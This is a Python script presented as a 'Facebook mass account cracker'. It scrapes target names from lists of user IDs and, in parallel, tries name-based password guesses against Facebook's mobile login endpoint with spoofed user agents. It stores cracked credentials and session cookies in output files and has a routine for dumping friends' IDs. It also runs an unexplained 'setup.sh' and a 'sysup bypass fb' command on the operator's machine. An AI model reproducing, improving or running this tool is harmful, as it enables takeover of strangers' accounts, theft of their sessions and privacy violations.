

#!/bin/python3
# Description: Facebook mass account cracker by NzD4rkPH
# Date: April 4, 2025 | Time: 8:32 PM


import requests
import os
import sys
import random
import time
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

logo = """\033[1;92m
\033[1;91m                        \ /
\033[1;93m _________________      \033[1;97mo\033[1;91mV\033[1;97mo
\033[1;93m ╔╗ ┬  ┬─┐ ┬╔═╗╔╗   \033[1;91m\___XXX___/
\033[1;93m ╠╩╗│  │┌┴┬┘╠╣ ╠╩╗   \033[1;91m__XXXXX__
\033[1;92m ╚═╝┴─┘┴┴ └─╚  ╚═╝  \033[1;91m/__XXXXX__\\
\033[1;93m –––––––––––––––––  \033[1;91m/   XXX   \\
\033[1;94m  -=[{\033[1;92mK3iX\033[1;94m}]=-        \033[1;91mV   \033[1;93m1.3
\033[1;91m –––––––––––––––––––––––––––––––"""
ok = 0
cp = 0
cot = 0
try:
    ccooked = open("cookie.txt", "r").read()
except:
    pass
ua = "Mozilla/5.0 (Linux; Android 10; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"
#ua = 'Mozilla/5.0 (Linux; Android 11; V2102) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.60 Mobile Safari/537.36'
g = "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]"
usr = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]", "Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]", "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]                                   Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]", "Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]"]);

if not os.path.exists("/data/data/com.termux/files/usr/bin/sysup"):
  print("\033[1;91m[!] FB bypass not found, Program might not work properly.")
  os.system("bash setup.sh")

def just():
    cookee = open("cookie.txt", "r").read()
    head = {
        'authority': 'p.facebook.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'user-agent': str(ua),
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookee,
         }
    chk = requests.get('https://p.facebook.com/NzD4rkS3c', headers=head).text
    hs = BeautifulSoup(chk, 'html.parser').title.text
    if hs == "Juster Ube":
        print("\033[1;91m [\033[1;92m*\033[1;91m] \033[1;92mLogin Successfully!\n")
        time.sleep(2)
        main()
    elif hs in ["Log into Facebook | Facebook","Log into Facebook"]:
        print("\033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Cookie expired / Invalid.")
        time.sleep(2)
        os.system("rm cookie.txt")
        exit()

    else:
        print("\033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Activity Has been limited. Please change acc.")
        os.system("rm cookie.txt")
        exit()


def cookie_log():
    if os.path.exists("cookie.txt") == True:
        just()
    else:
        os.system('clear')
        print(logo)
        cookiz = input(" \033[1;91m[\033[1;92m?\033[1;91m]\033[1;92m Cookie: \033[0m")
        if cookiz in ["", " "]:
            print(" \033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Please enter a valid cookie.")
            time.sleep(3)
            cookie_log()
        else:
            open("cookie.txt", "w").write(cookiz)
            time.sleep(1)
            just()


def login_pass():
    os.system('clear')
    print(logo)
    words = " \033[1;91m[\033[1;92m*\033[1;91m]\033[1;92m Logging-in\033[1;93m..."
    if os.path.exists("cookie.txt") == True:
        just()
    else:
            usrid = input(" \033[1;91m[\033[1;92m*\033[1;91m]\033[1;92m Facebook ID: ")
            if "1000" in usrid:
                pswd = input(' \033[1;91m[\033[1;92m*\033[1;91m]\033[1;92m Password: ')
                if pswd in ["", " "]:
                    print(" \033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Please enter a valid password.")
                    time.sleep(3)
                    login_pass()
                else:
                        lreq = requests.session()
                        lhead = {'authority': 'p.facebook.com',
                               'cache-control': 'max-age=0',
                               'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                               'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
                               'upgrade-insecure-requests': '1',
                               'content-type': 'application/x-www-form-urlencoded',
                               'user-agent': str(usr),
                               'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                               'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate',
                               'sec-fetch-user': '?1',
                               'sec-fetch-dest': 'document',
                               'referer': 'https://p.facebook.com/login/device-based/password/?uid='+str(usrid)+'&flow=login_no_pin&refsrc=deprecated&_rdr',
                               'accept-language': 'en-US,en;q=0.9',
                               }
                        lhacks = lreq.get('https://p.facebook.com/login/device-based/password/?uid='+str(usrid)+'&flow=login_no_pin&refsrc=deprecated&_rdr', headers=lhead)
                        lpar = BeautifulSoup(lhacks.text, "html.parser")
                        ljazoest = lpar.find('input', {'name': 'jazoest'})['value']
                        lnextz = lpar.find('input', {'name': 'next'})['value']
                        llsd = lpar.find('input', {'name': 'lsd'})['value']
                        ldata = {
                          'lsd': llsd,
                          'jazoest': ljazoest,
                          'uid': usrid,
                          'next': lnextz,
                          'flow': 'login_no_pin',
                          'pass': pswd,
                        }
                        for xbb in words:
                            time.sleep(0.1)
                            print(xbb, end="", flush=True)

                        os.system("sysup bypass fb")
                        lreq.post("https://p.facebook.com/login/device-based/validate-password/?shbl=0",data=ldata, headers=lhead, allow_redirects=False)
                        time.sleep(1)
                        lkuke = lreq.cookies.get_dict()
                        if 'c_user' in lkuke:
                            lkuki=f"c_user={lkuke.get('c_user')};fr={lkuke.get('fr')};xs={lkuke.get('xs')}"
                            open("cookie.txt","w").write(f"{lkuki}")
                            print()
                            print("\033[1;91m[\033[1;93m!\033[1;91m]\033[1;92m Login Successfully.")
                            just()
                        elif "checkpoint" in lkuke:
                            print(" \033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Account has been checkpoint!\n")
                            time.sleep(2)
                        else:
                            print(" \n\033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Invalid user / pass.")
                            time.sleep(3)
                            login_pass()
            else:
               print(" \033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Please enter a valid fb id.")
               time.sleep(3)
               login_pass()
def cracker(uids, urls):
    global cp,ok,cot
    try:
        req = requests.session()
        uaz = "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-G928A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/113.0.0.21.70;]"
        uav = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]", "Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]", "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]                                   Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]", "Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]", "Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]", "Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]", "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]", "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]"])
        headers = {'authority': f'{urls}',
               'cache-control': 'max-age=0',
               'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
               'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
               'upgrade-insecure-requests': '1',
               'content-type': 'application/x-www-form-urlencoded',
               'user-agent': str(uav),
               'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document',
               'referer': f'https://{urls}/login/device-based/password/?uid='+str(uids)+'&flow=login_no_pin&refsrc=deprecated&_rdr',
               'accept-language': 'en-US,en;q=0.9',
               }
        hacks = req.get(f'https://{urls}/login/device-based/password/?uid='+str(uids)+'&flow=login_no_pin&refsrc=deprecated&_rdr', headers=headers)
        par = BeautifulSoup(hacks.text, "html.parser")
        div = par.find("td")
        d = div.select_one(":nth-child(2)")
        if "..." in d.text:
            headd = {
                    'authority': 'p.facebook.com',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'upgrade-insecure-requests': '1',
                    'user-agent': str(uaz),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-site': 'none',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'accept-language': 'en-US,en;q=0.9',
                    'cookie': ccooked
                    }
            ulz = requests.get(f'https://p.facebook.com/profile.php?id='+uids, headers=headd).text
            first, *middle, last = BeautifulSoup(ulz, 'html.parser').title.text.lower().strip().split(" ")
        else:first, *middle, last = d.text.lower().strip().split(" ")
        jazoest = par.find('input', {'name': 'jazoest'})['value']
        nextz = par.find('input', {'name': 'next'})['value']
        lsd = par.find('input', {'name': 'lsd'})['value']
        wd = list([first+"15", first+'1234', first+"123", first+'143', first+"12345", first+'09', first+"2021", last+"15", last+'143', last+"123"])
        for ds in wd:
            print(f"UID {uids} {ds}")
            datas = {
              'lsd': lsd,
              'jazoest': jazoest,
              'uid': uids,
              'next': nextz,
              'flow': 'login_no_pin',
              'pass': ds,
            }
            req.post(f"https://{urls}/login/device-based/validate-password/?shbl=0", headers=headers, data=datas, allow_redirects=False)
            kuke = req.cookies.get_dict()
            if 'c_user' in kuke:
                ok =+1
                kuki=f"c_user={kuke.get('c_user')};fr={kuke.get('fr')};xs={kuke.get('xs')}"
                print("\033[1;92m [\033[1;91mNM\033[1;92m] \033[1;93m=> \033[1;95m" + first + " " + last + "\n\033[1;91m [\033[1;92mOK\033[1;91m]\033[1;92m > " + uids + "|" + ds + "\n\033[0m")
             #   print(f"\033[1;92m[\033[1;91mDE\033[1;92m]\033[1;92m => {cot}")
                open("cookies.txt","a").write(f"{kuki}\n")
                open("output/live.txt", "a").write("\nName: " + first + " " + last + "\n" + uids + "|" + ds)
                break
            elif "checkpoint" in kuke:
                cp =+1
                print("\033[1;92m [\033[1;91mNM\033[1;92m] \033[1;93m=> \033[1;95m" + first + " " + last + "\n\033[1;91m [\033[1;93mCP\033[1;91m]\033[1;92m > \033[1;93m" + uids + "|" + ds + "\n \033[0m")
            #    print(f"\033[1;92m[\033[1;91mDE\033[1;92m]\033[1;92m => {cot}")
                open("output/check.txt", "a").write("\nName: " + first + " " + last + "\n" + uids + "|" + ds)
                break
            else:
                continue
                cot =+1
    except:
            pass

def run():
    flist = input(" \033[1;91m[\033[1;92m*\033[1;91m] \033[1;93mFile\033[1;95m: ")
    if flist == "back":
        main()
    else:
        if os.path.exists(flist) == True:
            with open(flist, 'r') as ws:
                ww = ws.readlines()
                animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
                for i in range(len(animation)):
                    time.sleep(0.2)
                    sys.stdout.write("\r\033[1;91m [\033[1;92m*\033[1;91m] \033[1;93mLoading\033[1;91m: " + animation[i % len(animation)])
                    sys.stdout.flush()
                print("\n \033[1;91m[\033[1;92m*\033[1;91m] \033[1;93mTotal: \033[1;91m"+str(len(ww))+"\n")
                urlz = "p.facebook.com"
                with ThreadPoolExecutor(max_workers=5) as exb:
                    for uid in ww:
                        uis = uid.strip()
                        exb.submit(cracker, uis, urlz)
def login():
    os.system("clear")
    print(logo)
    print(""" \033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m Login with Cookie.
 \033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m Login with ID/Pass.

 \033[1;91m[\033[1;92m0\033[1;91m]\033[1;92m Exit.\n""")
    log = input(" \033[1;92mb1xf8\033[1;91m> ")
    try: init(log)
    except: print("\033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m ")
    if log in [" ", ""]:
        print("\033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Please enter a valid option.")
        time.sleep(2)
        login()
    elif log in ["1", "01"]:
        cookie_log()
    elif log in ["2", " 02"]:
        login_pass()
    else:
        print("\033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Please enter a valid option.")
def dump(url, uaz):
    headers = {
        'authority': 'p.facebook.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/357.0.0.23.115;]',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': ccooked,
        }
    reqs = requests.session()
    response = reqs.get(url+uaz, headers=headers).text
    par = BeautifulSoup(response, "html.parser")
    nex = par.find("a", text="See More Friends")['href']
    atag = par.find_all("a", href=True)
    for a in atag:
        print(a)
        h = a["href"]
        if "/1000" in h:
            print(h.replace('fb://profile/','').replace("/allactivity/", "").replace('/','').split('?')[0])
    if "lst=1000" in nex:
        dump("https://p.facebook.com",nex)
#dump("https://p.facebook.com", "/profile.php?v=friends")

def main():
    os.system("clear")
    print(logo)
    print(''' \033[1;94m[\033[1;92m>\033[1;94m]\033[1;92m Coded by: \033[1;93mK3iXPH
 \033[1;94m[\033[1;92m>\033[1;94m]\033[1;92m FB Goup:\033[1;93m CyberPhDr4X
\033[1;91m–––––––––––––––––––––––––––––––''')
    print(""" \033[1;91m[\033[1;92m1\033[1;91m]\033[1;93m=> \033[1;95mMulti Bruteforce.
 \033[1;91m[\033[1;92m2\033[1;91m]\033[1;93m=> \033[1;95mTarget Bruteforce.
 \033[1;91m[\033[1;92m3\033[1;91m]\033[1;93m=>\033[1;95m Dump IDs.
 \033[1;91m[\033[1;92m4\033[1;91m]\033[1;93m=>\033[1;95m Info.
 \033[1;91m[\033[1;92m5\033[1;91m]\033[1;93m=>\033[1;95m logout.
 \033[1;91m[\033[1;92m0\033[1;91m]\033[1;93m=>\033[1;95m Exit.
""")
    menu = input("\033[1;92m b1xf8\033[1;91m> \033[0m")
    if menu in ["",""]:
        print("\033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Select option.")
        time.sleep(2)
        main()
    elif menu in ["01","1"]:
        os.system("clear")
        print(logo)
        run()
    elif menu in ["02", "2"]:
        os.system("clear")
        print(logo)
        pass
    elif menu in ["03", "3"]:
        os.system("clear")
        print(logo)
# dumpz
    elif menu in ["04", "4"]:
        os.system("clear")
        print(logo)
        print(""" \033[1;94m[\033[1;92>\033[1;94m] \033[1;92m Coded by: \033[1;93m NzD4rkS4c

""")
        input("\033[1;91[\033[1;92m*\033[1;91m]\033[1;92m Back...")
        main()
    elif menu in ["05", "5"]:
        os.system("rm cookie.txt")
        print("\033[1;91m[\033[1;92m!\033[1;91m]\033[1;92m Bye bye!")
        exit()
    elif menu in ["00", "0"]:
        exit()

'''
#chk = requests.get('https://p.facebook.com/test', headers=head).text
#hs = BeautifulSoup(chk, 'html.parser').title.text
#if hs == "Kei Nanami":
#    main()
#elif hs in ["Log into Facebook | Facebook","Log into Facebook"]:
#    print("[!] Cookie expired / Invalid.")
#    time.sleep(2)
#    os.system("rm cookie.txt")
#    exit()
#
#else:
#    print("[!] Activity Has been limited. Please change acc.")
#    os.system("rm cookie.txt")
#    exit()
'''
if os.path.exists("cookie.txt") == True:
    just()
else:
    login()